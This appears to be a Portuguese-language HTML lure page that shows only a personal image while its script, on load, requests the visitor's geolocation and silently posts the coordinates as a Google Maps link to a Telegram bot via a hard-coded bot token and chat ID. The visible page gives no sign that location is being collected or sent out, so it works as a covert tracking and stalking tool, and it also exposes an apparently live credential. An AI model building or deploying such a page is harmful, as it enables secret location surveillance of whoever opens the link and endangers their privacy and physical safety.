<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Localização</title>
  <style>
    body {
      margin: 0;
      background-color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    img {
      max-width: 80%;
      height: auto;
    }
  </style>
</head>
<body>
  <!-- Substitui o texto por uma imagem -->
  <img src="imagem.jpg" alt="Imagem personalizada" />

  <script>
    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const message = `📍 Localização automática:\nhttps://www.google.com/maps?q=${lat},${lon}`;

      // Envia para o seu bot do Telegram (exemplo)
    const botToken = '8141924853:AAHS966DzZDHo0nJfxAkjFn8L6J0PnN-eok';
    const chatId = '7592879085';

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });
    }

    function handleError(error) {
      console.error('Erro ao obter localização:', error);
    }

    // Solicita localização ao carregar a página
    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
  </script>
</body>
</html>
